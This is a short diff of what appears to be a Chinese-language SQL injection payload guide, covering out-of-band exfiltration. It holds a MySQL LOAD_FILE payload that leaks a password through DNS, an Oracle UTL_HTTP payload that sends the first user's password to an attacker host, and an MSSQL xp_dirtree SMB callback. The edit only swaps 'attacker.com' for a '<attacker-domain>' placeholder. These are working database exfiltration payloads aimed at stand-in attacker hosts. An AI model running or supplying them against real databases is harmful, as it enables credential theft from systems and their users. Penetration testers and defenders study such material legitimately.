@@ -124,13 +124,13 @@ SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 0,1),'.dnslog.c
 ### 3.2 HTTP 带外 (Oracle)
 
 ```sql
-SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT password FROM users WHERE ROWNUM=1)) FROM DUAL
+SELECT UTL_HTTP.REQUEST('http://<attacker-domain>/'||(SELECT password FROM users WHERE ROWNUM=1)) FROM DUAL
 ```
 
 ### 3.3 SMB 带外 (MSSQL)
 
 ```sql
-EXEC xp_dirtree '\\attacker.com\share',1,1
+EXEC xp_dirtree '\\<attacker-domain>\share',1,1
 ```
 
 ## 4. INSERT 注入
